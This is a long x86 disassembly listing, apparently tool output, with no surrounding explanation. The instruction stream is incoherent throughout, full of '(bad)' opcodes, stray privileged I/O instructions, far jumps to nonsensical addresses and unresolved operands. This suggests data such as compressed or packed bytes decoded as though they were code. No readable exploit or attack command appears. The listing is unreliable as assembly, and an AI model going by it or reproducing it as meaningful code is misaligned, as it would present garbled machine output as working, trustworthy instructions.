  419c3d:	std    
  419c3e:	ds pop esi
  419c40:	cmc    
  419c41:	inc    ebx
  419c42:	or     eax,0x79a5b309
  419c47:	or     al,0xd1
  419c49:	icebp  
  419c4a:	cs mov bl,0x66
  419c4d:	jg     0x419c34
  419c4f:	leave  
  419c50:	ret    0x6a7b
  419c53:	cs inc ebp
  419c55:	and    al,0x84
  419c57:	push   0x7ab3617f
  419c5c:	loop   0x419c96
  419c5e:	jae    0x419c55
  419c60:	(bad)  
  419c61:	and    esp,DWORD PTR [ecx-0x12]
  419c64:	jp     0x419bf9
  419c66:	cmp    ebx,edi
  419c68:	or     eax,DWORD PTR [ebp-0x40]
  419c6b:	xchg   DWORD PTR [esi+eax*1-0x379597e3],ebp
  419c72:	cmp    eax,0x84cbf6fb
  419c77:	and    ebp,DWORD PTR [edx-0x3e]
  419c7a:	rcl    BYTE PTR [ebx+0x51],0x50
  419c7e:	add    DWORD PTR [ebp+ecx*8-0x27],edx
  419c82:	add    DWORD PTR [ebx+0x7e1aafd2],eax
  419c88:	sbb    esp,0xffffff90
  419c8b:	call   0x2b19:0xb65ff093
  419c92:	adc    esp,0x648898aa
  419c98:	inc    ebx
  419c99:	pop    ss
  419c9a:	cli    
  419c9b:	sahf   
  419c9c:	push   eax
  419c9d:	and    dh,bl
  419c9f:	pop    ds
  419ca0:	retf   
  419ca1:	push   ecx
  419ca2:	dec    ebx
  419ca3:	mov    edx,0x6d3faba7
  419ca8:	mov    ebx,0xb963820c
  419cad:	leave  
  419cae:	cli    
  419caf:	add    al,0xcc
  419cb1:	int3   
  419cb2:	scas   al,BYTE PTR es:[edi]
  419cb3:	jmp    0xa0cc738e
  419cb8:	xor    DWORD PTR [eax],esp
  419cba:	cmp    al,0xdb
  419cbc:	ret    
  419cbd:	jmp    0x419d1f
  419cbf:	sar    DWORD PTR [edi],1
  419cc1:	loope  0x419c98
  419cc3:	fwait
  419cc4:	cmp    DWORD PTR [edi+0x4ea6dc71],ecx
  419cca:	lea    ebx,[ecx]
  419ccc:	popa   
  419ccd:	mov    ebx,0xaac801af
  419cd2:	mov    DWORD PTR [esi+0x72],ecx
  419cd5:	cdq    
  419cd6:	push   edi
  419cd7:	pushf  
  419cd8:	or     BYTE PTR [ecx-0x38],al
  419cdb:	sbb    BYTE PTR [ecx+0x58],cl
  419cde:	mov    eax,ds:0x55c8481e
  419ce3:	fild   DWORD PTR [ebx]
  419ce5:	imul   edx,ecx,0xfffffff7
  419ce8:	iret   
  419ce9:	add    DWORD PTR [ebp-0x42],ecx
  419cec:	stc    
  419ced:	cld    
  419cee:	fmul   st,st(4)
  419cf0:	or     ebx,esp
  419cf2:	mov    WORD PTR [eax],gs
  419cf4:	ror    BYTE PTR [esp+ecx*1+0x7c7f3be4],1
  419cfb:	xchg   edi,eax
  419cfc:	sbb    eax,0x2e4be9f1
  419d01:	leave  
  419d02:	adc    ch,bl
  419d04:	loopne 0x419d30
  419d06:	cli    
  419d07:	jno    0x419cca
  419d09:	add    bl,BYTE PTR [edx+0x6adbbb9d]
  419d0f:	or     cl,BYTE PTR [ebp+ebx*4+0x408875bf]
  419d16:	fmul   st,st(4)
  419d18:	lahf   
  419d19:	in     eax,dx
  419d1a:	cs daa 
  419d1c:	push   0xffffffd8
  419d1e:	pop    ds
  419d1f:	mov    edx,0x109230b2
  419d24:	(bad)  
  419d25:	out    0x49,eax
  419d27:	jo     0x419cfc
  419d29:	dec    ebp
  419d2a:	inc    ebp
  419d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d2c:	pusha  
  419d2d:	add    eax,0x76152bb5
  419d32:	sti    
  419d33:	test   DWORD PTR [edx+ebx*1],ecx
  419d36:	mov    ds:0xe5ed6baa,eax
  419d3b:	jmp    0x419d41
  419d3d:	xchg   DWORD PTR ds:0x368349a2,ebx
  419d43:	push   es
  419d44:	adc    DWORD PTR [edi],esi
  419d46:	jne    0x419d5f
  419d48:	fdecstp 
  419d4a:	xchg   edx,eax
  419d4b:	aam    0xe0
  419d4d:	test   eax,0x8f87f9bf
  419d52:	(bad)  
  419d53:	push   ss
  419d54:	ins    DWORD PTR es:[edi],dx
  419d55:	jno    0x419cf7
  419d57:	scas   al,BYTE PTR es:[edi]
  419d58:	mov    eax,ds:0x19e4709
  419d5d:	mov    ebx,0x1f4fd030
  419d62:	sbb    al,0x97
  419d64:	jo     0x419d10
  419d66:	dec    ecx
  419d67:	test   DWORD PTR [eax+esi*8],ebx
  419d6a:	mov    DWORD PTR [esi],esi
  419d6c:	fs das 
  419d6e:	aas    
  419d6f:	adc    eax,0x4f2043f
  419d74:	lock jmp 0x8db8ea44
  419d7a:	fisubr WORD PTR [esi+0x5d]
  419d7d:	adc    BYTE PTR [ebp-0x4a7102d0],bh
  419d83:	out    dx,al
  419d84:	cs sti 
  419d86:	(bad)  
  419d87:	fadd   QWORD PTR [ebp+0x8]
  419d8a:	jbe    0x419dd6
  419d8c:	ins    DWORD PTR es:[edi],dx
  419d8d:	jge    0x419d16
  419d8f:	paddq  mm3,mm2
  419d92:	out    0xf9,al
  419d94:	mov    esi,0x9152a9a9
  419d99:	mov    edi,0xe72d4f95
  419d9e:	icebp  
  419d9f:	cld    
  419da0:	push   es
  419da1:	retf   0x8958
  419da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da5:	lods   eax,DWORD PTR ds:[esi]
  419da6:	int3   
  419da7:	jp     0x419d8e
  419da9:	ja     0x419e18
  419dab:	mov    al,ds:0xe9235205
  419db0:	in     eax,dx
  419db1:	pop    esp
  419db2:	push   ecx
  419db3:	or     al,0x8a
  419db5:	dec    esi
  419db6:	and    DWORD PTR [eiz*1+0x6622d890],edx
  419dbd:	push   cs
  419dbe:	dec    ecx
  419dbf:	cmp    ebx,DWORD PTR [esi+0x54]
  419dc2:	inc    esp
  419dc3:	jb     0x419dc5
  419dc5:	fnstsw WORD PTR ds:[ecx-0x6fa6079b]
  419dcc:	push   ss
  419dcd:	inc    ebp
  419dce:	fwait
  419dcf:	mov    ecx,0x3aa8a922
  419dd4:	cmp    eax,0xdec13aa4
  419dd9:	(bad)  
  419dda:	pop    ds
  419ddb:	mov    ebx,0xfcc7011c
  419de0:	xchg   edx,eax
  419de1:	shl    BYTE PTR [ecx+edx*4],cl
  419de4:	addr16 jp 0x419daf
  419de7:	fild   DWORD PTR [edx]
  419de9:	xchg   ebx,eax
  419dea:	push   0xc9454282
  419def:	bound  ecx,QWORD PTR [ebp-0x1bd8dff]
  419df5:	mov    ch,0x2b
  419df8:	call   0x6624:0x7aa9ff55
  419dff:	(bad)  
  419e00:	push   ebx
  419e01:	adc    eax,DWORD PTR [edi+ebp*4-0x411eaf27]
  419e08:	nop
  419e09:	scas   eax,DWORD PTR es:[edi]
  419e0a:	sub    esi,DWORD PTR [esp+eiz*4-0x74]
  419e0e:	dec    esi
  419e0f:	out    0xaa,eax
  419e11:	or     edx,DWORD PTR [ecx+0x50]
  419e14:	or     ch,ch
  419e16:	jmp    0xbf7b:0x10029020
  419e1d:	int    0xa1
  419e1f:	mov    bh,0xab
  419e21:	mov    dl,0x25
  419e23:	mov    al,ds:0x1d1bb9d5
  419e28:	rcl    ecx,0x2
  419e2b:	imul   ebx,edi,0xffffff8b
  419e2e:	leave  
  419e2f:	fwait
  419e30:	push   ecx
  419e31:	jne    0x419e2e
  419e33:	rcr    ecx,1
  419e35:	loopne 0x419e3b
  419e37:	punpcklbw mm1,mm5
  419e3a:	test   al,0x4a
  419e3c:	loopne 0x419e65
  419e3e:	into   
  419e3f:	in     al,0xb7
  419e41:	mov    bl,BYTE PTR [ecx]
  419e43:	inc    eax
  419e44:	in     eax,dx
  419e45:	jnp    0x419e71
  419e47:	and    dl,dh
  419e49:	cdq    
  419e4a:	adc    esp,edi
  419e4c:	sbb    dl,BYTE PTR [edx-0xbdc7f84]
  419e52:	nop
  419e53:	jno    0x419e32
  419e55:	ins    DWORD PTR es:[edi],dx
  419e56:	adc    eax,0x11adab89
  419e5c:	sub    bh,dl
  419e5e:	mov    ch,0x8e
  419e60:	dec    ebx
  419e61:	push   ebp
  419e62:	daa    
  419e63:	out    0xd4,eax
  419e65:	adc    ch,0xb5
  419e68:	xor    al,0x54
  419e6a:	mov    ch,0x34
  419e6c:	test   DWORD PTR [ecx],ecx
  419e6e:	mov    ah,0x53
  419e70:	mov    ebp,0x698ed51f
  419e75:	loop   0x419ebc
  419e77:	sar    DWORD PTR [esi],0x8d
  419e7a:	sub    dh,BYTE PTR ss:[edi]
  419e7d:	addr16 das 
  419e7f:	pushf  
  419e80:	push   edi
  419e81:	(bad)  
  419e82:	retf   
  419e83:	cld    
  419e84:	jns    0x419e36
  419e86:	add    eax,0xf9e951cf
  419e8b:	dec    eax
  419e8c:	add    DWORD PTR [edx+ebx*2+0x9187f5d],0x44
  419e94:	pop    edi
  419e95:	inc    eax
  419e96:	ret    
  419e97:	or     DWORD PTR [eax-0x16],0x7fc14e62
  419e9e:	mov    DWORD PTR [eax+0x4b],ecx
  419ea1:	sub    edx,eax
  419ea3:	div    ebp
  419ea5:	repz test eax,0xad4d74d7
  419eab:	pushf  
  419eac:	fmul   QWORD PTR [ebx+ecx*1+0x53]
  419eb0:	inc    edx
  419eb1:	shl    BYTE PTR [ecx-0x1076e8d],1
  419eb7:	xor    al,0xdf
  419eb9:	scas   al,BYTE PTR es:[edi]
  419eba:	out    0xa0,eax
  419ebc:	mov    ebx,0x96f574db
  419ec1:	cmp    BYTE PTR [ebx],cl
  419ec3:	xchg   ecx,eax
  419ec4:	(bad)  
  419ec5:	(bad)  
  419ec6:	jmp    0x824f0b61
  419ecb:	repz pop ebp
  419ecd:	inc    edx
  419ece:	inc    eax
  419ecf:	shr    DWORD PTR [eax],1
  419ed1:	outs   dx,DWORD PTR ds:[esi]
  419ed2:	data16 mov ds,WORD PTR [edi+0x69]
  419ed6:	mov    ebp,0xab3129aa
  419edb:	sbb    ecx,DWORD PTR [edi-0x40]
  419ede:	jge    0x419ef1
  419ee0:	jno    0x419ece
  419ee2:	loopne 0x419e76
  419ee4:	pop    eax
  419ee5:	lods   al,BYTE PTR ds:[esi]
  419ee6:	mov    esi,0xbad53614
  419eeb:	pop    edi
  419eec:	mov    ebx,DWORD PTR [edx+0x66]
  419eef:	mov    ?,ebx
  419ef1:	xchg   edi,eax
  419ef2:	mov    edi,0x1a7298
  419ef7:	shr    BYTE PTR ds:0x855eeb96,cl
  419efd:	cld    
  419efe:	inc    esi
  419eff:	jb     0x419ea2
  419f01:	pop    ebp
  419f02:	int    0xb7
  419f04:	scas   eax,DWORD PTR es:[edi]
  419f05:	jmp    0xc64:0x821077a1
  419f0c:	arpl   WORD PTR [edi+0x7a],ax
  419f0f:	sahf   
  419f10:	pop    edx
  419f11:	fwait
  419f12:	sub    ecx,DWORD PTR [eax-0x350868d1]
  419f18:	repz jno 0x419f2a
  419f1b:	std    
  419f1c:	imul   edx,DWORD PTR [ecx-0x6f],0xeeba4f0b
  419f23:	loopne 0x419f95
  419f25:	pop    edi
  419f26:	inc    esi
  419f27:	pop    ds
  419f28:	rcl    DWORD PTR [edx+ebp*8+0x6f],cl
  419f2c:	in     eax,0x72
  419f2e:	popa   
  419f2f:	in     eax,dx
  419f30:	pop    esi
  419f31:	loope  0x419f31
  419f33:	sbb    eax,0x33913dee
  419f38:	push   eax
  419f39:	add    eax,0xcd850c6e
  419f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f3f:	mov    bl,0xc
  419f41:	push   0x43
  419f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f44:	mov    BYTE PTR [ebx+0x63],bl
  419f47:	jne    0x419f76
  419f49:	and    DWORD PTR [eax],eax
  419f4b:	mov    al,fs:0x16b73f4d
  419f51:	ror    BYTE PTR [ebx+0x2c46579d],0x9e
  419f58:	pop    es
  419f59:	data16 scas al,BYTE PTR es:[edi]
  419f5b:	repz add BYTE PTR [edx],bh
  419f5e:	not    DWORD PTR [ebx]
  419f60:	push   edi
  419f61:	jno    0x419fb0
  419f63:	jle    0x419f4a
  419f65:	fisubr WORD PTR [ecx+ecx*4+0x64]
  419f69:	add    eax,0x208cc285
  419f6e:	inc    ecx
  419f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f70:	sbb    DWORD PTR [edi+edi*8],ebp
  419f73:	mov    esp,0x4bdfa205
  419f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f79:	mov    WORD PTR [ebp+0x58450f8f],fs
  419f7f:	shl    esp,cl
  419f81:	cdq    
  419f82:	xor    esp,DWORD PTR [ebx-0x6653ea0]
  419f88:	enter  0x4e0c,0xd
  419f8c:	(bad)  
  419f8d:	js     0x419ff9
  419f8f:	xchg   esi,eax
  419f90:	(bad)  
  419f91:	sbb    BYTE PTR [edi+0x7bbce87b],ch
  419f97:	js     0x419fa9
  419f99:	jp     0x419f73
  419f9b:	in     eax,0xb4
  419f9d:	mov    BYTE PTR [edi],ah
  419f9f:	mov    esp,0xee7bd082
  419fa4:	in     al,dx
  419fa5:	sbb    dl,BYTE PTR [eax-0x4]
  419fa8:	or     ebp,esi
  419faa:	dec    ebp
  419fab:	dec    ebp
  419fac:	into   
  419fad:	out    0x77,eax
  419faf:	cdq    
  419fb0:	hlt    
  419fb1:	out    dx,al
  419fb2:	pop    ebx
  419fb3:	mov    edx,0xab70f5b9
  419fb8:	xchg   DWORD PTR [edx-0x30],esp
  419fbb:	imul   esp,DWORD PTR [eax],0x92cb8375
  419fc1:	jmp    FWORD PTR [edi+0x6c46d9a9]
  419fc7:	or     al,0x38
  419fc9:	ret    0x5817
  419fcc:	or     eax,ecx
  419fce:	es sub eax,0xe8ebab2a
  419fd4:	inc    edx
  419fd5:	icebp  
  419fd6:	inc    ebp
  419fd7:	sub    bh,BYTE PTR [eax+0xf]
  419fda:	add    eax,0x267b3370
  419fdf:	popf   
  419fe0:	lods   eax,DWORD PTR ds:[esi]
  419fe1:	xor    al,0x86
  419fe3:	mov    eax,ds:0x53ff9620
  419fe8:	daa    
  419fe9:	mul    BYTE PTR [esi]
  419feb:	mov    ds:0x19412431,al
  419ff0:	mov    ss,WORD PTR [eax+0x304ca8fd]
  419ff6:	mov    ah,0xb
  419ff8:	fwait
  419ff9:	push   0x7e
  419ffb:	inc    ecx
  419ffc:	sub    al,BYTE PTR [ebx]
  419ffe:	cmp    eax,0x68f184ef
  41a003:	mov    ecx,0x470181ea
  41a008:	mov    bh,0xc6
  41a00a:	gs inc ecx
  41a00c:	or     BYTE PTR [ecx+0x1e],dh
  41a00f:	and    bh,BYTE PTR [eax-0x6f14fda7]
  41a015:	retf   0xd646
  41a018:	add    DWORD PTR [ecx+0x6d5aaf2e],esp
  41a01e:	inc    eax
  41a01f:	popa   
  41a020:	push   es
  41a021:	test   DWORD PTR [esi+0x78496eff],0x8b9ebb1f
  41a02b:	imul   ecx,ecx,0xffffffbe
  41a02e:	repnz xchg ecx,eax
  41a030:	add    DWORD PTR [esi-0x3f611c6c],esi
  41a036:	nop
  41a037:	add    cl,BYTE PTR [edx+0x7b2d1359]
  41a03d:	gs pop edx
  41a03f:	in     eax,dx
  41a040:	mov    WORD PTR [esi-0x23aefca],gs
  41a046:	das    
  41a047:	and    al,0xf
  41a049:	aaa    
  41a04a:	dec    edx
  41a04b:	jl     0x41a03a
  41a04d:	fst    QWORD PTR [esi]
  41a04f:	cmp    BYTE PTR [eax],bh
  41a051:	fsubr  st(1),st
  41a053:	add    ch,BYTE PTR ds:0xce94ed8a
  41a059:	or     DWORD PTR [edx+0x14],ebx
  41a05c:	mov    ebp,DWORD PTR [edx-0x6bc45a23]
  41a062:	mov    eax,0x77e55ebe
  41a067:	iret   
  41a068:	xchg   edi,eax
  41a069:	push   ds
  41a06a:	dec    ebp
  41a06b:	mov    cl,0xa6
  41a06d:	or     al,ah
  41a06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a070:	paddq  mm5,QWORD PTR [eax+edx*8+0x2]
  41a075:	xlat   BYTE PTR ds:[ebx]
  41a076:	lock xchg BYTE PTR [ebp+0x11],dl
  41a07a:	add    eax,0xae29e456
  41a07f:	hlt    
  41a080:	es xchg ecx,eax
  41a082:	cmc    
  41a083:	adc    al,0x5f
  41a085:	mov    dh,0x95
  41a087:	fnstcw WORD PTR [edx+0x7c]
  41a08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a08b:	push   edi
  41a08c:	cmp    eax,0xd4012098
  41a091:	out    dx,eax
  41a092:	in     al,dx
  41a093:	not    cl
  41a095:	es mov ebx,0xb8c43fb1
  41a09b:	das    
  41a09c:	imul   DWORD PTR [edx]
  41a09e:	add    DWORD PTR [ecx+edx*8],0xffffffff
  41a0a2:	retf   0xa9b2
  41a0a5:	loopne 0x41a078
  41a0a7:	das    
  41a0a8:	clc    
  41a0a9:	cld    
  41a0aa:	fnstsw WORD PTR [esi]
  41a0ac:	stos   DWORD PTR es:[edi],eax
  41a0ad:	loopne 0x41a09d
  41a0af:	mov    dl,bl
  41a0b1:	mov    al,ds:0x78a6fa1b
  41a0b6:	nop
  41a0b7:	push   esi
  41a0b8:	xchg   esi,eax
  41a0b9:	fistp  QWORD PTR ds:0x142ab11
  41a0bf:	jle    0x41a0c1
  41a0c1:	test   eax,0x6f53af70
  41a0c6:	es ftst 
  41a0c9:	dec    ebp
  41a0ca:	add    eax,0x4ba4cf6e
  41a0cf:	ins    BYTE PTR es:[edi],dx
  41a0d0:	sbb    eax,0x89f14c01
  41a0d5:	mov    edi,0xf18c768a
  41a0da:	push   eax
  41a0db:	shl    BYTE PTR [eax+0x37],cl
  41a0de:	fldcw  WORD PTR [edi+ebp*8]
  41a0e1:	aas    
  41a0e2:	into   
  41a0e3:	je     0x41a159
  41a0e5:	push   ebx
  41a0e6:	push   es
  41a0e7:	xor    ecx,DWORD PTR [esi]
  41a0e9:	pop    ebx
  41a0ea:	sub    BYTE PTR [edx+0x4bf9bfaa],ah
  41a0f0:	cmc    
  41a0f1:	(bad)  
  41a0f2:	out    0x5a,eax
  41a0f4:	mov    dl,0x64
  41a0f6:	sahf   
  41a0f7:	push   esp
  41a0f8:	shr    DWORD PTR ds:0xf60063e1,cl
  41a0fe:	sub    al,0x13
  41a100:	push   0x27
  41a102:	and    ecx,edi
  41a104:	jo     0x41a0fa
  41a106:	mov    dh,0x48
  41a108:	imul   esp,DWORD PTR [edx-0x54],0xffffff87
  41a10c:	ret    0x804c
  41a10f:	xor    DWORD PTR [edi],ebp
  41a111:	aaa    
  41a112:	call   0x9819bdac
  41a117:	aad    0x62
  41a119:	daa    
  41a11a:	inc    eax
  41a11b:	lahf   
  41a11c:	das    
  41a11d:	shl    DWORD PTR [edx+eax*1-0x7f],1
  41a121:	test   BYTE PTR [ecx],0xab
  41a124:	adc    BYTE PTR [edi+ebx*2-0x16],ah
  41a128:	out    0xcb,eax
  41a12a:	nop
  41a12b:	and    al,0xa8
  41a12d:	scas   al,BYTE PTR es:[edi]
  41a12e:	sti    
  41a12f:	push   cs
  41a130:	daa    
  41a131:	neg    BYTE PTR [esi+eiz*8+0x50]
  41a135:	xchg   ebx,eax
  41a136:	jbe    0x41a125
  41a138:	pop    ebp
  41a139:	xor    edi,DWORD PTR [ecx-0x13]
  41a13c:	mov    DWORD PTR [edi],ebp
  41a13e:	lods   al,BYTE PTR ds:[esi]
  41a13f:	dec    esp
  41a140:	test   DWORD PTR [edi-0x77],0x1fad5cf9
  41a147:	mov    edx,0x7b5462cb
  41a14c:	pop    ss
  41a14d:	mov    DWORD PTR [esp+ebp*4],ecx
  41a150:	xchg   BYTE PTR [edi+0x1b],ah
  41a153:	dec    ebx
  41a154:	push   ecx
  41a155:	in     eax,dx
  41a156:	out    dx,al
  41a157:	add    BYTE PTR [ecx],dh
  41a159:	daa    
  41a15a:	rol    BYTE PTR [edi+0x755dbd5a],0x67
  41a161:	pop    eax
  41a162:	imul   sp,WORD PTR [ebp+0x15c96bc4],0xffaa
  41a16a:	(bad)  
  41a16b:	mov    al,0x8c
  41a16d:	(bad)  
  41a16e:	cmp    esi,esp
  41a170:	xchg   ebx,eax
  41a171:	mov    WORD PTR [esi-0x4c],ss
  41a174:	rcr    bl,0xe7
  41a177:	int3   
  41a178:	rol    DWORD PTR [edi+0x38],cl
  41a17b:	mov    ch,dl
  41a17d:	mov    edx,0xb5c88330
  41a182:	push   esp
  41a183:	push   ebp
  41a184:	sub    esp,DWORD PTR [esi+eiz*2]
  41a187:	lods   eax,DWORD PTR ds:[esi]
  41a188:	adc    DWORD PTR [ecx+0x44],edx
  41a18b:	stos   DWORD PTR es:[edi],eax
  41a18c:	xchg   ebx,eax
  41a18d:	call   0x2183d9a3
  41a192:	retf   
  41a193:	pop    edx
  41a194:	xchg   ebp,eax
  41a195:	fimul  WORD PTR [esi+0x6b2e7772]
  41a19b:	or     eax,0x7a5ecd20
  41a1a0:	mov    cs,ebp
  41a1a2:	pop    edx
  41a1a3:	jbe    0x41a153
  41a1a5:	test   BYTE PTR [edi+0x3f],bh
  41a1a8:	xchg   ebx,eax
  41a1a9:	jmp    0x41a219
  41a1ab:	sbb    esi,edx
  41a1ad:	pop    es
  41a1ae:	sub    eax,0xda341b8a
  41a1b3:	xchg   ah,dh
  41a1b5:	push   0xffffffc1
  41a1b7:	int3   
  41a1b8:	mov    al,BYTE PTR [esp+eax*8]
  41a1bb:	pop    ss
  41a1bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1bd:	inc    esi
  41a1be:	jle    0x41a15d
  41a1c0:	xor    BYTE PTR [ebx+0xed62ed9],bh
  41a1c6:	rcl    DWORD PTR [ebx+0x3c],0x6c
  41a1ca:	push   esi
  41a1cb:	push   esp
  41a1cc:	(bad)
  41a1cf:	pop    ebx
  41a1d0:	and    al,0x54
  41a1d2:	inc    edi
  41a1d3:	inc    eax
  41a1d4:	mov    ds:0x84724ada,eax
  41a1d9:	popf   
  41a1da:	hlt    
  41a1db:	or     al,0xe6
  41a1dd:	jecxz  0x41a1c0
  41a1df:	mov    edi,0x4e16ea5a
  41a1e4:	inc    edx
  41a1e5:	sbb    ecx,0x491986e
  41a1eb:	dec    edx
  41a1ec:	test   cl,al
  41a1ee:	ret    0x5737
  41a1f1:	add    DWORD PTR [ecx+0xe],edi
  41a1f4:	fidiv  DWORD PTR [ebp-0x3c2c1b34]
  41a1fa:	sub    edi,0xffffff88
  41a1fd:	mov    eax,0x2b172e87
  41a202:	shl    DWORD PTR [esi],1
  41a204:	jb     0x41a214
  41a206:	dec    esi
  41a207:	fsub   DWORD PTR [ecx]
  41a209:	mov    ah,0xd3
  41a20b:	sbb    DWORD PTR [ebp-0x384f6c5a],esi
  41a211:	int    0xd0
  41a213:	outs   dx,BYTE PTR ds:[esi]
  41a214:	aas    
  41a215:	dec    esi
  41a216:	sub    edi,DWORD PTR [esp+ecx*4]
  41a219:	push   cs
  41a21a:	sub    bh,bl
  41a21c:	in     eax,dx
  41a21d:	push   0xe
  41a21f:	add    BYTE PTR [ebx+0x1f],bl
  41a222:	push   ebp
  41a223:	arpl   WORD PTR [ebx],di
  41a225:	sti    
  41a226:	pop    ebp
  41a227:	dec    eax
  41a228:	jo     0x41a25d
  41a22a:	sub    BYTE PTR [edi],al
  41a22c:	jns    0x41a270
  41a22e:	rcl    esp,1
  41a230:	sar    DWORD PTR [ebp-0x21],0x2f
  41a234:	mov    esi,0x5731a79e
  41a239:	ja     0x41a215
  41a23b:	pop    esi
  41a23c:	ds (bad) 
  41a23f:	ins    DWORD PTR es:[edi],dx
  41a240:	jge    0x41a281
  41a242:	push   edx
  41a243:	scas   al,BYTE PTR es:[edi]
  41a244:	leave  
  41a245:	inc    esp
  41a246:	dec    edx
  41a247:	outs   dx,BYTE PTR ds:[esi]
  41a248:	enter  0x1271,0x72
  41a24c:	and    al,0xa1
  41a24e:	and    edx,edi
  41a250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a251:	ins    BYTE PTR es:[edi],dx
  41a252:	dec    eax
  41a253:	push   ebx
  41a254:	cmp    dl,cl
  41a256:	arpl   WORD PTR [edx],si
  41a258:	popf   
  41a259:	mov    esp,0xfbee82a6
  41a25e:	rcr    BYTE PTR [ebp-0x78],cl
  41a261:	inc    esi
  41a262:	dec    edi
  41a263:	daa    
  41a264:	sub    BYTE PTR [eax-0x5e],bh
  41a267:	mov    ecx,0x547f819b
  41a26c:	in     al,dx
  41a26d:	out    0xf7,eax
  41a26f:	sbb    bl,BYTE PTR [ebx-0x14edaf70]
  41a275:	rcl    DWORD PTR [ecx+0x4e3e4646],1
  41a27b:	clc    
  41a27c:	add    eax,0x6c88289
  41a281:	sbb    bh,BYTE PTR [ebx]
  41a283:	mov    ebx,0x3143fc53
  41a288:	imul   ebx,DWORD PTR [ebx+ecx*8],0xef49d3c3
  41a28f:	mov    al,0x1
  41a291:	(bad)  
  41a292:	cmp    ebp,DWORD PTR [edx]
  41a294:	mov    ?,WORD PTR [edx+0x7e]
  41a297:	outs   dx,DWORD PTR ds:[esi]
  41a298:	cmp    bl,dl
  41a29a:	jb     0x41a2ae
  41a29c:	inc    eax
  41a29d:	adc    eax,0x664d72b6
  41a2a2:	sbb    DWORD PTR [esp+ecx*1+0x6b],ecx
  41a2a6:	and    al,0x8a
  41a2a8:	int    0xab
  41a2aa:	jle    0x41a252
  41a2ac:	cdq    
  41a2ad:	je     0x41a29b
  41a2af:	mul    BYTE PTR [esi+0x15]
  41a2b2:	mov    fs,WORD PTR [ebx+0x64944eac]
  41a2b8:	inc    ecx
  41a2b9:	test   DWORD PTR [ebp+0x440f976],eax
  41a2bf:	xor    BYTE PTR [eax-0x66e0803b],0x96
  41a2c6:	call   0xfa6ae73
  41a2cb:	(bad)  
  41a2cc:	frstor [ebp-0x6fc4c219]
  41a2d2:	fsubr  DWORD PTR ds:0xa0529040
  41a2d8:	or     DWORD PTR [edi],0x71b77a83
  41a2de:	retf   0xd33e
  41a2e1:	adc    ecx,DWORD PTR [ebx+0x6d]
  41a2e4:	mov    ecx,0x5de07ab2
  41a2e9:	or     BYTE PTR [eax],dh
  41a2eb:	inc    eax
  41a2ec:	mov    dl,0xb5
  41a2ee:	stc    
  41a2ef:	adc    al,0xeb
  41a2f1:	dec    BYTE PTR [eax+ebp*1]
  41a2f4:	push   esp
  41a2f5:	loopne 0x41a341
  41a2f7:	ins    DWORD PTR es:[edi],dx
  41a2f8:	fs call 0x63a1a4f2
  41a2fe:	and    ecx,DWORD PTR [eax-0x47961254]
  41a304:	mov    esp,0xbd5d784c
  41a309:	add    dl,BYTE PTR [eax-0x65]
  41a30c:	enter  0x2e7c,0x72
  41a310:	scas   al,BYTE PTR es:[edi]
  41a311:	push   edi
  41a312:	inc    edx
  41a313:	jp     0x41a2ad
  41a315:	fstp   QWORD PTR [ecx+edi*8]
  41a318:	mov    ds:0x5690321b,eax
  41a31d:	xor    edx,DWORD PTR [eax+0x16]
  41a320:	ret    
  41a321:	inc    ecx
  41a322:	add    ebp,DWORD PTR [esi]
  41a324:	add    BYTE PTR [eax-0x3a],ch
  41a327:	nop
  41a328:	aas    
  41a329:	push   ds
  41a32a:	stos   BYTE PTR es:[edi],al
  41a32b:	ret    0x29f2
  41a32e:	fsub   DWORD PTR [eax-0x26]
  41a331:	push   edi
  41a332:	mov    BYTE PTR [eax-0x4b],dh
  41a335:	xchg   ebp,eax
  41a336:	jmp    0x41a398
  41a338:	hlt    
  41a339:	aas    
  41a33a:	and    edi,DWORD PTR [ecx]
  41a33c:	mov    DWORD PTR [edx],esp
  41a33e:	adc    al,0x35
  41a340:	sbb    al,0x4a
  41a342:	mov    dh,0x4b
  41a344:	ret    
  41a345:	mov    dh,0xd4
  41a347:	mov    ?,eax
  41a349:	lods   eax,DWORD PTR ds:[esi]
  41a34a:	xchg   ebx,eax
  41a34b:	xchg   esi,eax
  41a34c:	mov    ah,0x67
  41a34e:	cmp    eax,0x136cd6a8
  41a353:	and    edi,eax
  41a355:	loope  0x41a3b8
  41a357:	jmp    0xb59c210
  41a35c:	push   ss
  41a35d:	pop    esi
  41a35e:	(bad)  
  41a35f:	mov    dl,0xbb
  41a361:	or     DWORD PTR [ebp+0x3f497dbd],ecx
  41a367:	into   
  41a368:	outs   dx,DWORD PTR ds:[esi]
  41a369:	nop
  41a36a:	mov    edx,0x816634e8
  41a36f:	push   0xffffffc9
  41a371:	adc    al,BYTE PTR [edx-0x78]
  41a374:	add    eax,0x97ebdda9
  41a379:	call   0xa607:0xcf07a1ee
  41a380:	ret    0xabb1
  41a383:	cld    
  41a384:	push   edx
  41a385:	out    dx,al
  41a386:	and    al,0x6e
  41a388:	jmp    0xbd51:0xb6e22581
  41a38f:	(bad)  
  41a391:	sbb    eax,0x410804a6
  41a396:	imul   ebp,DWORD PTR [esi-0x3f97a45f],0xf116ac93
  41a3a0:	fisub  DWORD PTR [edx-0x12]
  41a3a3:	mov    ah,0x21
  41a3a5:	call   DWORD PTR [eax+esi*4]
  41a3a8:	mov    dl,0xe4
  41a3aa:	mov    esp,0x79d57a8c
  41a3af:	xchg   ebx,eax
  41a3b0:	(bad)  
  41a3b3:	mov    ?,WORD PTR [ebx+0x4f]
  41a3b6:	jno    0x41a36b
  41a3b8:	shl    DWORD PTR [eax-0x9579060],0x68
  41a3bf:	ds jae 0x41a387
  41a3c2:	pusha  
  41a3c3:	sar    BYTE PTR [edi+edx*4+0x42],0xc4
  41a3c8:	ret    0x54c3
  41a3cb:	push   esi
  41a3cc:	int3   
  41a3cd:	js     0x41a36e
  41a3cf:	cmp    eax,0x93ae7200
